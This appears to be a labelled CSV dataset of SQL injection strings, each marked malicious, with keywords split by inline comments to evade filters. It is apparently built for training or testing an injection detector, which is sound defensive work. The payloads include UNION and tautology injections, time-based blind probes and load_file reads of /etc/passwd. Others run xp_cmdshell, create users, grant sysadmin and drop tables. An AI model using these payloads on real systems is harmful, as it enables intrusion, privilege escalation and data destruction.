Query,Label
admi/**/n' o/**/r ',1
' sele/**/ct * f/**/rom i/**/nfo/**/rmation_schema.t/**/ables--,1
 )  union sele/**/ct * fro/**/m i/**/nfo/**/rmation_schema.t/**/ables;,1
' havi/**/ng 1 = 1--,1
' havi/**/ng 1 = 1--,1
' group b/**/y userid havi/**/ng 1 = 1--,1
' sel/**/ect name fr/**/om syscolumns whe/**/re id  =   ( s/**/elect id f/**/rom sysobjects wher/**/e name  =  t/**/ablename' ) --,1
' o/**/r 1 i/**/n  ( s/**/elect @@version ) --,1
' union all s/**/elect @@version--,1
' o/**/r 'unusual'  =  'unusual',1
' o/**/r 'somethi/**/ng'  =  'some'+'thi/**/ng',1
' o/**/r 'text'  =  n'text',1
' o/**/r 'somethi/**/ng' lik/**/e 'some%',1
' o/**/r 2 > 1,1
' o/**/r 'text' > 't',1
' o/**/r 'whatever' i/**/n  ( 'whatever' ) ,1
' o/**/r 2 betw/**/een 1 a/**/nd 3,1
' o/**/r username lik/**/e char ( 37 ) ;,1
"' union sele/**/ct * fro/**/m users whe/**/re logi/**/n  =  char ( 114,111,111,116 ) ;",1
' union se/**/lect ,1
passwo/**/rd:*/ = 1--,1
uni/**/on sel/**/ect,1
'; execute immediate 'sel' || 'ect us' || 'er',1
'; exec  ( 'sel' + 'ect us' + 'er' ) ,1
'/**/o/**/r/**/1/**/ = /**/1,1
' o/**/r 1/*,1
 o/**/r i/**/sN/**/ULL ( 1/0 )  /*,1
' o/**/r '7659' = '7659,1
""" o/**/r i/**/sNUL/**/L ( 1/0 )  /*",1
' -- &passwo/**/rd = ,1
'; begi/**/n declare @var varchar ( 8000 )  s/**/et @var = ':' se/**/lect @var = @var+'+logi/**/n+'/'+passwo/**/rd+' ' fro/**/m users whe/**/re logi/**/n > ,1
@var selec/**/t @var as var i/**/nt/**/o temp end --,1
' a/**/nd 1 i/**/n  ( se/**/lect var fr/**/om temp ) --,1
"' union s/**/elect 1,load_file ( '/etc/passwd' ) ,1,1,1;",1
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1
"' an/**/d 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;",1
'; exec master..xp_cmdshell 'pi/**/ng 10.10.1.2'--,1
crea/**/te user name identified b/**/y 'pass123',1
crea/**/te user name identified b/**/y pass123 tempo/**/rary tab/**/lespace temp default ta/**/blespace users; ,1
' ; dr/**/op ta/**/ble temp --,1
"exec sp_addlogi/**/n 'name' , 'passwo/**/rd'",1
"exec sp_addsrvrolemember 'name' , 'sysadmi/**/n'",1
"i/**/ns/**/ert i/**/n/**/to mysql.user  ( user, host, passwo/**/rd )  va/**/lues  ( 'name', 'localhost', passwo/**/rd ( 'pass123'  )  )  ",1
grant connect to name; grant resource to name;,1
"i/**/ns/**/ert i/**/n/**/to users ( logi/**/n, passwo/**/rd, level )  value/**/s (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) ",1
' o/**/r 1 = 1 --,1
' union  ( sele/**/ct @@version )  --,1
"' union  ( s/**/elect N/**/ULL,  ( sel/**/ect @@version  )  )   --",1
"' union  ( s/**/elect NUL/**/L, N/**/ULL,  ( s/**/elect @@version  )  )   --",1
"' union  ( sel/**/ect NUL/**/L, NU/**/LL, NUL/**/L,   ( s/**/elect @@version  )  )   --",1
"' union  ( sel/**/ect NUL/**/L, N/**/ULL, NU/**/LL, N/**/ULL,   ( selec/**/t @@version  )  )   --",1
"' union  ( sele/**/ct NUL/**/L, N/**/ULL, NU/**/LL, NU/**/LL,  NU/**/LL,  ( sele/**/ct @@version  )  )   --",1
"'; if no/**/t ( substri/**/ng  (  (  se/**/lect @@version ) ,25,1 )  <> 0 )  waitfo/**/r delay '0:0:2' --",1
"'; if no/**/t ( substri/**/ng  (  (  selec/**/t @@version ) ,25,1 )  <> 5 )  waitfo/**/r delay '0:0:2' --",1
"'; if no/**/t ( substri/**/ng  (  (  se/**/lect @@version ) ,25,1 )  <> 8 )  waitfo/**/r delay '0:0:2' --",1
"'; if no/**/t ( substri/**/ng  (  (  sel/**/ect @@version ) ,24,1 )  <> 1 )  waitfo/**/r delay '0:0:2' --",1
'; if n/**/ot ( s/**/elect system_user )  <> 'sa' waitfo/**/r delay '0:0:2' --,1
'; if i/**/s_srvrolemember ( 'sysadmi/**/n' )  > 0 waitfo/**/r delay '0:0:2' -- ,1
'; if no/**/t  (  (  se/**/lect serverproperty ( 'i/**/si/**/ntegratedsecurityonly'  )  )   <> 1 )  waitfo/**/r delay '0:0:2' --,1
'; if no/**/t  (  (  s/**/elect serverproperty ( 'i/**/si/**/ntegratedsecurityonly'  )  )   <> 0 )  waitfo/**/r delay '0:0:2' --,1
" selec/**/t * fr/**/om users w/**/here id = 1 o/**/r  ( \ )  = 1 union selec/**/t 1,@@VERSION -- 1",1
" sele/**/ct * f/**/rom users w/**/here id = 1 o/**/r  ( \. )  = 1 union sele/**/ct 1,@@VERSION -- 1",1
 selec/**/t * fr/**/om users wh/**/ere id = 1 o/**/r  ( \+ )  = 1 o/**/r 1 = 1 -- 1,1
" sele/**/ct * f/**/rom users w/**/here id = 1 o/**/r  ( 1 )  = 1 union sele/**/ct 1,banner fro/**/m v$version whe/**/re rownum = 1 -- 1",1
" sele/**/ct * fr/**/om users wher/**/e id = 1 o/**/r  ( \+ )  = 1 union se/**/lect 1,@@VERSION -- 1",1
 sele/**/ct * fro/**/m users w/**/here id = 1 o/**/r  ( $+ )  = 1 o/**/r 1 = 1 -- 1,1
" sele/**/ct * fro/**/m users wher/**/e id = 1 o/**/r  ( $+ )  = 1 union sele/**/ct 1,@@VERSION -- 1",1
 selec/**/t * fro/**/m users wher/**/e id = 1 o/**/r \.<\ o/**/r 1 = 1 -- 1,1
 sel/**/ect * fr/**/om users wh/**/ere id = 1 o/**/r \.<1 o/**/r 1 = 1 -- 1,1
" se/**/lect * f/**/rom users wh/**/ere id = 1 o/**/r \.<1 union s/**/elect 1,@@VERSION -- 1",1
" sele/**/ct * fr/**/om users wher/**/e id = 1 o/**/r \.<\ union selec/**/t 1,@@VERSION -- 1",1
 s/**/elect * fro/**/m users wher/**/e id = 1 o/**/r \.<$ o/**/r 1 = 1 -- 1,1
" sele/**/ct * fr/**/om users wher/**/e id = 1 o/**/r \.<$ union s/**/elect 1,@@VERSION -- 1",1
" s/**/elect * fro/**/m users w/**/here id = 1 o/**/r \.<  = 1 union se/**/lect 1,@@VERSION -- 1",1
" selec/**/t * fro/**/m users wh/**/ere id = 1 ||1 union sel/**/ect 1,banner fro/**/m v$version wher/**/e rownum = 1 -- 1",1
" selec/**/t * fr/**/om users whe/**/re id = 1 ||1 union sele/**/ct nul/**/l,banner fr/**/om v$version w/**/here rownum = 1 -- 1",1
 sel/**/ect * fro/**/m users wher/**/e id = 1   o/**/r 1 = 1 -- 1,1
 sel/**/ect * fro/**/m users wher/**/e id = 1 o/**/r \+<\ o/**/r 1 = 1 -- 1,1
" sele/**/ct * fro/**/m users wh/**/ere id = 1 o/**/r  1<@ = 1 union selec/**/t 1,version (  )  -- 1",1
" sele/**/ct * f/**/rom users w/**/here id = 1 o/**/r \+<\ union se/**/lect 1,@@VERSION -- 1",1
" selec/**/t * fr/**/om users wher/**/e id = 1 o/**/r \+<$ union s/**/elect 1,@@VERSION -- 1",1
" selec/**/t * fro/**/m users whe/**/re id = 1 o/**/r 1&@# = 1 union s/**/elect 1,version (  )  -- 1",1
" selec/**/t * fro/**/m users wh/**/ere id = 1 o/**/r $ . = 1 union se/**/lect 1,@@VERSION -- 1",1
 sele/**/ct * fro/**/m users whe/**/re id = 1 o/**/r $ 1 = 1 o/**/r 1 = 1 -- 1,1
" se/**/lect * f/**/rom users w/**/here id = 1 o/**/r $ 1 = 1 union selec/**/t 1,@@VERSION -- 1",1
 se/**/lect * f/**/rom users wh/**/ere id = 1 o/**/r $<\ o/**/r 1 = 1 -- 1,1
 sel/**/ect * fr/**/om users wher/**/e id = 1 o/**/r $<\. o/**/r 1 = 1 -- 1,1
" selec/**/t * f/**/rom users whe/**/re id = 1 o/**/r $<\. union se/**/lect 1,@@VERSION -- 1",1
" sele/**/ct * fro/**/m users wher/**/e id = 1 o/**/r $<\ union selec/**/t 1,@@VERSION -- 1",1
 sele/**/ct * f/**/rom users w/**/here id = 1 o/**/r $+<\ o/**/r 1 = 1 -- 1,1
" s/**/elect * fro/**/m users whe/**/re id = 1 o/**/r $+<1 union sele/**/ct 1,@@VERSION -- 1",1
" s/**/elect * fr/**/om users wh/**/ere id = 1 o/**/r $+<\ union sel/**/ect 1,@@VERSION -- 1",1
" selec/**/t * f/**/rom users wher/**/e id = 1 o/**/r $+<$ union selec/**/t 1,@@VERSION -- 1",1
 sele/**/ct * fr/**/om users wh/**/ere id = 1 o/**/r \<\. o/**/r 1 = 1 -- 1,1
" s/**/elect * f/**/rom users w/**/here id = 1 o/**/r \<\. union se/**/lect 1,@@VERSION -- 1",1
 sele/**/ct * fro/**/m users w/**/here id = 1 o/**/r \<1 o/**/r 1 = 1 -- 1,1
" sele/**/ct * fro/**/m users wher/**/e id = 1 o/**/r \<1 union se/**/lect 1,@@VERSION -- 1",1
" sele/**/ct * fr/**/om users w/**/here id = 1 o/**/r \<\ union sele/**/ct 1,@@VERSION -- 1",1
" sel/**/ect * f/**/rom users wh/**/ere id = 1 o/**/r \<\ union sel/**/ect n/**/ull,@@VERSION -- 1",1
 sel/**/ect * fr/**/om users whe/**/re id = 1 o/**/r \<$ o/**/r 1 = 1 -- 1,1
" se/**/lect * fro/**/m users wh/**/ere id = 1 o/**/r \<$ union s/**/elect 1,@@VERSION -- 1",1
 sel/**/ect * f/**/rom users wh/**/ere id = 1 o/**/r \<  = 1 o/**/r 1 = 1 -- 1,1
" s/**/elect * fr/**/om users wher/**/e id = 1 o/**/r \<  = 1 union se/**/lect 1,@@VERSION -- 1",1
 s/**/elect * fro/**/m users wher/**/e id = 1 o/**/r !<@ o/**/r 1 = 1 -- 1,1
" sel/**/ect * f/**/rom users w/**/here id = 1 o/**/r !<@ union se/**/lect 1,version (  )  -- 1",1
" s/**/elect * fr/**/om users whe/**/re id = 1 o/**/r @`\` union s/**/elect 1,version (  )  -- 1",1
" selec/**/t * fro/**/m users w/**/here id = 1 o/**/r  @$# = 1 union s/**/elect 1,version (  )  -- 1",1
" se/**/lect * fro/**/m users whe/**/re id = 1 o/**/r @<@ = 1 union se/**/lect 1,version (  )  -- 1",1
 sele/**/ct * fro/**/m users whe/**/re id = 1 + ( \ )  o/**/r 1 = 1 -- 1,1
" s/**/elect * f/**/rom users w/**/here id = 1 + ( \ )  union sel/**/ect n/**/ull,@@VERSION -- 1",1
" sel/**/ect * f/**/rom users whe/**/re id = 1.&&1 union selec/**/t 1,version (  )  -- 1",1
 s/**/elect * f/**/rom users wh/**/ere id = 1. o/**/r 1 = 1 -- 1,1
" selec/**/t * fr/**/om users wh/**/ere id = 1.&&@ union s/**/elect 1,version (  )  -- 1",1
 sel/**/ect * fro/**/m users whe/**/re id = 1 +  ( \. )  o/**/r 1 = 1 -- 1,1
" sel/**/ect * fro/**/m users whe/**/re id = 1 +  ( \. )  union se/**/lect nu/**/ll,@@VERSION -- 1",1
" s/**/elect * fr/**/om users w/**/here id = 1.  union s/**/elect 1,version (  )  -- 1",1
" sele/**/ct * fr/**/om users wher/**/e id = 1. union selec/**/t 1,banner f/**/rom v$version w/**/here rownum = 1 -- 1",1
" selec/**/t * fr/**/om users whe/**/re id = 1.  union s/**/elect version (  ) ,version (  )  -- 1",1
" selec/**/t * fr/**/om users wher/**/e id = 1. union selec/**/t nu/**/ll,version (  )  -- 1",1
" se/**/lect * fro/**/m users wh/**/ere id = 1 +\. union sel/**/ect nu/**/ll,@@VERSION -- 1",1
" sele/**/ct * fr/**/om users whe/**/re id = 1. union selec/**/t nul/**/l,banner fr/**/om v$version wher/**/e rownum = 1 -- 1",1
 sel/**/ect * fro/**/m users wher/**/e id = 1. <@ o/**/r 1 = 1 -- 1,1
 sele/**/ct * fro/**/m users w/**/here id = 1.<@. o/**/r 1 = 1 -- 1,1
" se/**/lect * f/**/rom users wh/**/ere id = 1.<@. union s/**/elect 1,version (  )  -- 1",1
 se/**/lect * fro/**/m users whe/**/re id = 1.*1 o/**/r 1 = 1 -- 1,1
" se/**/lect * fr/**/om users whe/**/re id = 1.*1 union s/**/elect 1,banner fro/**/m v$version wh/**/ere rownum = 1 -- 1",1
" sele/**/ct * f/**/rom users wher/**/e id = 1.<1# union se/**/lect 1,version (  )  -- 1",1
" sele/**/ct * fro/**/m users w/**/here id = 1. <@ union sel/**/ect 1,version (  )  -- 1",1
" sel/**/ect * fr/**/om users wher/**/e id = 1. <@ union selec/**/t version (  ) ,version (  )  -- 1",1
" selec/**/t * f/**/rom users whe/**/re id = 1.*\ union sel/**/ect nu/**/ll,@@VERSION -- 1",1
 sel/**/ect * fro/**/m users w/**/here id = 1.<@$ o/**/r 1 = 1 -- 1,1
" sel/**/ect * fr/**/om users whe/**/re id = 1.<@$ union selec/**/t 1,version (  )  -- 1",1
 s/**/elect * fr/**/om users whe/**/re id = 1.%@ o/**/r 1 = 1 -- 1,1
" sel/**/ect * f/**/rom users wher/**/e id = 1.%@ union sel/**/ect 1,version (  )  -- 1",1
" se/**/lect * fro/**/m users wher/**/e id = 11||1 union selec/**/t 1,banner f/**/rom v$version wh/**/ere rownum = 1 -- 1",1
 sel/**/ect * fro/**/m users wher/**/e id = 1 +1 o/**/r 1 = 1 -- 1,1
 sel/**/ect * f/**/rom users w/**/here id = 1 + ( 1 )  o/**/r 1 = 1 -- 1,1
" sel/**/ect * fr/**/om users wher/**/e id = 1 + ( 1 )  union se/**/lect 1,banner fr/**/om v$version wher/**/e rownum = 1 -- 1",1
" selec/**/t * fro/**/m users whe/**/re id = 1 + ( 1 )  union se/**/lect nul/**/l,banner f/**/rom v$version whe/**/re rownum = 1 -- 1",1
" selec/**/t * fro/**/m users wh/**/ere id = 1 +1 union sele/**/ct 1,banner fro/**/m v$version whe/**/re rownum = 1 -- 1",1
" sele/**/ct * fro/**/m users wher/**/e id = 1 +1 union sele/**/ct nu/**/ll,banner f/**/rom v$version wh/**/ere rownum = 1 -- 1",1
" se/**/lect * f/**/rom users w/**/here id = 11<1# union se/**/lect 1,version (  )  -- 1",1
 s/**/elect * fr/**/om users wh/**/ere id = 1 +  ( \+ )  o/**/r 1 = 1 -- 1,1
" selec/**/t * fr/**/om users wh/**/ere id = 1 +  ( \+ )  union selec/**/t nu/**/ll,@@VERSION -- 1",1
" sel/**/ect * f/**/rom users whe/**/re id = 1 +\+. union s/**/elect nul/**/l,@@VERSION -- 1",1
" se/**/lect * fr/**/om users wher/**/e id = 1 -1<@ union sel/**/ect 1,version (  )  -- 1",1
" selec/**/t * fr/**/om users whe/**/re id = 1 +1<@ union sel/**/ect version (  ) ,version (  )  -- 1",1
" s/**/elect * fro/**/m users wher/**/e id = 1 +1<@ union sel/**/ect n/**/ull,version (  )  -- 1",1
 selec/**/t * f/**/rom users wh/**/ere id = 1 + \+%\ o/**/r 1 = 1 -- 1,1
 sele/**/ct * fr/**/om users w/**/here id = 1 + \+%1 o/**/r 1 = 1 -- 1,1
" selec/**/t * fr/**/om users whe/**/re id = 1 + \+%1 union se/**/lect nu/**/ll,@@VERSION -- 1",1
" se/**/lect * fr/**/om users wher/**/e id = 1 + \+*\ union selec/**/t nu/**/ll,@@VERSION -- 1",1
 s/**/elect * fro/**/m users wher/**/e id = 1 + \+%$ o/**/r 1 = 1 -- 1,1
" sele/**/ct * fr/**/om users wher/**/e id = 1 + \+*$ union sele/**/ct n/**/ull,@@VERSION -- 1",1
" selec/**/t * f/**/rom users w/**/here id = 1 union se/**/lect  ( 1 ) ,banner fro/**/m v$version wher/**/e rownum = 1 -- 1",1
" sele/**/ct * fro/**/m users wher/**/e id = 1 union sele/**/ct 1||1,version (  )  -- 1",1
" selec/**/t * f/**/rom users w/**/here id = 1 union se/**/lect 1||@,version (  )  -- 1",1
" sele/**/ct * f/**/rom users w/**/here id = 1 union selec/**/t 1 1$,version (  )  -- 1",1
" selec/**/t * f/**/rom users wher/**/e id = 1 union sel/**/ect 1 $,version (  )  -- 1",1
" se/**/lect * fr/**/om users w/**/here id = 1 union sel/**/ect 1 1a,version (  )  -- 1",1
" se/**/lect * fr/**/om users wher/**/e id = 1 union selec/**/t 1<@$,version (  )  -- 1",1
" s/**/elect * f/**/rom users whe/**/re id = 1 union sel/**/ect 1,banner f/**/rom v$version wher/**/e rownum = 1 -- 1",1
" selec/**/t * fro/**/m users wh/**/ere id = 1 union selec/**/t .1_,version (  )  -- 1",1
" se/**/lect * fr/**/om users whe/**/re id = 1 union sele/**/ct 1`\`,version (  )  -- 1",1
" sel/**/ect * f/**/rom users whe/**/re id = 1 union sele/**/ct 1a#,banner fro/**/m v$version wher/**/e rownum = 1 -- 1",1
" s/**/elect * fr/**/om users wher/**/e id = 1 union sele/**/ct 1a,banner fr/**/om v$version whe/**/re rownum = 1 -- 1",1
" selec/**/t * f/**/rom users whe/**/re id = 1 union s/**/elect .1$_,version (  )  -- 1",1
" se/**/lect * fr/**/om users w/**/here id = 1 union selec/**/t 1<@,version (  )  -- 1",1
" se/**/lect * fr/**/om users wher/**/e id = 1 union sele/**/ct 1<@.,version (  )  -- 1",1
" s/**/elect * fro/**/m users whe/**/re id = 1 union se/**/lect 1 $$,version (  )  -- 1",1
" sele/**/ct * fro/**/m users whe/**/re id = 1 union se/**/lect !<1,version (  )  -- 1",1
" se/**/lect * fro/**/m users wher/**/e id = 1 union s/**/elect +!<1,version (  )  -- 1",1
" selec/**/t * f/**/rom users wher/**/e id = 1 union sel/**/ect +!<@,version (  )  -- 1",1
" sel/**/ect * f/**/rom users wher/**/e id = 1 union sele/**/ct !<@,version (  )  -- 1",1
" s/**/elect * fro/**/m users whe/**/re id = 1 union selec/**/t @||1,version (  )  -- 1",1
" sel/**/ect * fr/**/om users wher/**/e id = 1 union sele/**/ct @&&@,version (  )  -- 1",1
" sele/**/ct * fro/**/m users whe/**/re id = 1 union sele/**/ct @ 1$,version (  )  -- 1",1
" sele/**/ct * fro/**/m users wher/**/e id = 1 union se/**/lect  @ $,version (  )  -- 1",1
" selec/**/t * fro/**/m users whe/**/re id = 1 union se/**/lect @ 1a,version (  )  -- 1",1
" se/**/lect * fr/**/om users w/**/here id = 1 union se/**/lect @<@$,version (  )  -- 1",1
" se/**/lect * f/**/rom users whe/**/re id = 1   union selec/**/t n/**/ull,banner fro/**/m v$version wh/**/ere rownum = 1 -- 1",1
" s/**/elect * fr/**/om users wh/**/ere id = 1 union se/**/lect @ _,version (  )  -- 1",1
" sele/**/ct * fro/**/m users w/**/here id = 1 union sele/**/ct @ $_,version (  )  -- 1",1
" se/**/lect * fro/**/m users wher/**/e id = 1 union se/**/lect @<@,version (  )  -- 1",1
" se/**/lect * fro/**/m users wh/**/ere id = 1 union s/**/elect @<@.,version (  )  -- 1",1
" selec/**/t * fro/**/m users w/**/here id = 1 union se/**/lect @ $$,version (  )  -- 1",1
 s/**/elect * fro/**/m users whe/**/re id = 1 +$ . o/**/r 1 = 1 -- 1,1
" sel/**/ect * fro/**/m users wh/**/ere id = 1 +$ . union se/**/lect n/**/ull,@@VERSION -- 1",1
 sele/**/ct * fro/**/m users wher/**/e id = 1 +$ 1 o/**/r 1 = 1 -- 1,1
" s/**/elect * fr/**/om users w/**/here id = 1 +$ 1 union sele/**/ct nu/**/ll,@@VERSION -- 1",1
 sele/**/ct * f/**/rom users wh/**/ere id = 1 +$+ o/**/r 1 = 1 -- 1,1
 se/**/lect * fro/**/m users whe/**/re id = 1 +  ( $+ )  o/**/r 1 = 1 -- 1,1
" sel/**/ect * fro/**/m users wher/**/e id = 1 +  ( $+ )  union sel/**/ect n/**/ull,@@VERSION -- 1",1
 sele/**/ct * fro/**/m users whe/**/re id = 1 +$+. o/**/r 1 = 1 -- 1,1
" selec/**/t * fro/**/m users wh/**/ere id = 1 +$+. union selec/**/t nu/**/ll,@@VERSION -- 1",1
" sel/**/ect * fr/**/om users wher/**/e id = 1 +$+ union s/**/elect nul/**/l,@@VERSION -- 1",1
 s/**/elect * fr/**/om users w/**/here id = 1 + $+%\ o/**/r 1 = 1 -- 1,1
 sele/**/ct * fr/**/om users wh/**/ere id = 1 + $+%1 o/**/r 1 = 1 -- 1,1
" selec/**/t * f/**/rom users whe/**/re id = 1 + $+%1 union sel/**/ect nul/**/l,@@VERSION -- 1",1
" sele/**/ct * fro/**/m users whe/**/re id = 1 + $+*\ union sele/**/ct n/**/ull,@@VERSION -- 1",1
 sele/**/ct * fro/**/m users w/**/here id = 1 + $+%$ o/**/r 1 = 1 -- 1,1
" sel/**/ect * fr/**/om users wh/**/ere id = 1 + $+*$ union sele/**/ct n/**/ull,@@VERSION -- 1",1
 selec/**/t * fr/**/om users whe/**/re id = 1 <@ o/**/r 1 = 1 -- 1,1
 sel/**/ect * fr/**/om users wh/**/ere id = 1 % ( \ )  o/**/r 1 = 1 -- 1,1
" s/**/elect * fr/**/om users whe/**/re id = 1 * ( \ )  union sel/**/ect nu/**/ll,@@VERSION -- 1",1
 se/**/lect * fr/**/om users wh/**/ere id = 1 % ( 1 )  o/**/r 1 = 1 -- 1,1
" sele/**/ct * f/**/rom users wher/**/e id = 1 * ( 1 )  union sel/**/ect 1,banner fro/**/m v$version wh/**/ere rownum = 1 -- 1",1
 sel/**/ect * fr/**/om users wh/**/ere id = 1 % ( $ )  o/**/r 1 = 1 -- 1,1
 se/**/lect * f/**/rom users wh/**/ere id = 1 % ( @ )  o/**/r 1 = 1 -- 1,1
 se/**/lect * fro/**/m users wher/**/e id = 1 <@. o/**/r 1 = 1 -- 1,1
 sel/**/ect * fro/**/m users whe/**/re id = 1 <@.. o/**/r 1 = 1 -- 1,1
" selec/**/t * fro/**/m users w/**/here id = 1<@.. union sele/**/ct 1,version (  )  -- 1",1
" s/**/elect * f/**/rom users w/**/here id = 1 <@. union s/**/elect 1,version (  )  -- 1",1
" sele/**/ct * fro/**/m users wh/**/ere id = 1  <@. union selec/**/t version (  ) ,version (  )  -- 1",1
" sel/**/ect * fro/**/m users w/**/here id = 1 *\. union sele/**/ct nu/**/ll,@@VERSION -- 1",1
 sele/**/ct * fro/**/m users whe/**/re id = 1 <@.$ o/**/r 1 = 1 -- 1,1
" s/**/elect * f/**/rom users whe/**/re id = 1 <@.$ union sele/**/ct 1,version (  )  -- 1",1
 sel/**/ect * fro/**/m users wher/**/e id = 1 *1 o/**/r 1 = 1 -- 1,1
" selec/**/t * f/**/rom users w/**/here id = 1 *1 union selec/**/t 1,banner fro/**/m v$version w/**/here rownum = 1 -- 1",1
" se/**/lect * fro/**/m users w/**/here id = 1 *1 union se/**/lect n/**/ull,banner f/**/rom v$version wher/**/e rownum = 1 -- 1",1
" sel/**/ect * fr/**/om users wher/**/e id = 1 <1## union se/**/lect 1,version (  )  -- 1",1
 sel/**/ect * fr/**/om users wher/**/e id = 1 <@1$ o/**/r 1 = 1 -- 1,1
" sel/**/ect * f/**/rom users wh/**/ere id = 1 <@1$ union sel/**/ect 1,version (  )  -- 1",1
" selec/**/t * fro/**/m users wher/**/e id = 1 *\ union se/**/lect nul/**/l,@@VERSION -- 1",1
 sele/**/ct * f/**/rom users w/**/here id = 1 <@$ o/**/r 1 = 1 -- 1,1
 sele/**/ct * fr/**/om users wh/**/ere id = 1 %$ . o/**/r 1 = 1 -- 1,1
" sel/**/ect * f/**/rom users wh/**/ere id = 1 *$ . union s/**/elect nu/**/ll,@@VERSION -- 1",1
 selec/**/t * fro/**/m users w/**/here id = 1 %$ 1 o/**/r 1 = 1 -- 1,1
" sel/**/ect * f/**/rom users wh/**/ere id = 1 %$ 1 union sele/**/ct n/**/ull,@@VERSION -- 1",1
 sele/**/ct * fr/**/om users wher/**/e id = 1 <@$_ o/**/r 1 = 1 -- 1,1
" se/**/lect * fr/**/om users w/**/here id = 1 <@$_ union se/**/lect 1,version (  )  -- 1",1
 selec/**/t * fr/**/om users w/**/here id = 1 <@<@ o/**/r 1 = 1 -- 1,1
 sel/**/ect * f/**/rom users wh/**/ere id = 1 %!<1 o/**/r 1 = 1 -- 1,1
" sele/**/ct * fro/**/m users w/**/here id = 1 | |1 union sel/**/ect 1,banner fr/**/om v$version whe/**/re rownum = 1 -- 1",1
" se/**/lect * f/**/rom users whe/**/re id = 1<@<@ union sel/**/ect 1,version (  )  -- 1",1
" s/**/elect * fro/**/m users wher/**/e id = 1 <@<@ union s/**/elect version (  ) ,version (  )  -- 1",1
" sele/**/ct * fr/**/om users wher/**/e id = 1 <@<@ union se/**/lect nu/**/ll,version (  )  -- 1",1
 selec/**/t * fr/**/om users w/**/here id = 1 %!<@ o/**/r 1 = 1 -- 1,1
" selec/**/t * f/**/rom users wher/**/e id = 1 <@&@ union sel/**/ect 1,version (  )  -- 1",1
" selec/**/t * f/**/rom users wher/**/e id = 1 <@$$ union selec/**/t 1,version (  )  -- 1",1
 s/**/elect * fro/**/m users whe/**/re id = 1 &@ o/**/r 1 = 1 -- 1,1
" sele/**/ct * fro/**/m users whe/**/re id = '1' o/**/r ||/1 = 1 union selec/**/t 1,version (  )  -- 1'",1
" sel/**/ect * fro/**/m users wh/**/ere id = '1' o/**/r  ( \ )  = 1 union sele/**/ct 1,@@VERSION -- 1'",1
" selec/**/t * fro/**/m users w/**/here id = '1' o/**/r  ( \. )  = 1 union se/**/lect 1,@@VERSION -- 1'",1
" sel/**/ect * fro/**/m users whe/**/re id = '1' o/**/r  ( 1 )  = 1 union sele/**/ct 1,banner fr/**/om v$version w/**/here rownum = 1 -- 1'",1
 selec/**/t * f/**/rom users wh/**/ere id = '1' o/**/r \.<\ o/**/r 1 = 1 -- 1',1
" sele/**/ct * fr/**/om users wher/**/e id = '1' o/**/r \.<1 union selec/**/t 1,@@VERSION -- 1'",1
" selec/**/t * f/**/rom users wh/**/ere id = '1' o/**/r \.<\ union sel/**/ect 1,@@VERSION -- 1'",1
" selec/**/t * fr/**/om users wh/**/ere id = '1' o/**/r \.<$ union selec/**/t 1,@@VERSION -- 1'",1
" sel/**/ect * fro/**/m users wh/**/ere id = '1' o/**/r \.<  = 1 union sel/**/ect 1,@@VERSION -- 1'",1
" selec/**/t * fr/**/om users wher/**/e id = '1' ||1 union sel/**/ect 1,banner fro/**/m v$version whe/**/re rownum = 1 -- 1'",1
 se/**/lect * fro/**/m users wher/**/e id = '1'   o/**/r 1 = 1 -- 1',1
" se/**/lect * fro/**/m users whe/**/re id = '1' o/**/r 1^ = 1 union selec/**/t 1,banner fr/**/om v$version w/**/here rownum = 1 -- 1'",1
" selec/**/t * fro/**/m users wher/**/e id = '1' o/**/r $ . = 1 union se/**/lect 1,@@VERSION -- 1'",1
 se/**/lect * fr/**/om users wher/**/e id = '1' o/**/r $ 1 = 1 o/**/r 1 = 1 -- 1',1
" sele/**/ct * fr/**/om users whe/**/re id = '1' o/**/r $ 1 = 1 union sel/**/ect 1,@@VERSION -- 1'",1
 sel/**/ect * fro/**/m users wher/**/e id = '1' o/**/r $<\ o/**/r 1 = 1 -- 1',1
" sel/**/ect * fro/**/m users wh/**/ere id = '1' o/**/r $<\. union se/**/lect 1,@@VERSION -- 1'",1
" s/**/elect * fro/**/m users w/**/here id = '1' o/**/r $<\ union sel/**/ect 1,@@VERSION -- 1'",1
" selec/**/t * f/**/rom users whe/**/re id = '1' o/**/r $+<$ union se/**/lect 1,@@VERSION -- 1'",1
